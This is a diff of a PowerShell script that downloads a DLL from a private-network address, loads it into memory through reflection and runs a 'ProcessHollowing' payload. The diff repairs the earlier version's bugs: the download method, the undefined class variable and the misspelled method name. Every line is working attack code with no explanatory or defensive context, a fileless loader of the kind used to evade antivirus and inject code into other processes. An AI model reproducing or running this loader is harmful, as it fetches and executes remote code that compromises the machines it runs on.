@@ -1,4 +1,6 @@
-$data = (New-Object System.Net.WebClient).DownloadString('http://192.168.216.145/test.dll')
+$url = 'http://192.168.178.32/test.dll'
+$data = (New-Object System.Net.WebClient).DownloadData($url)
 $assem = [System.Reflection.Assembly]::Load($data)
-$method = $class.Getmethod("Runer")
-$method.Invoke(0, $null)
+$class = $assem.GetType("ProcessHollowing.Hollowing")
+$method = $class.GetMethod("Runner")
+$method.Invoke($null, $null)
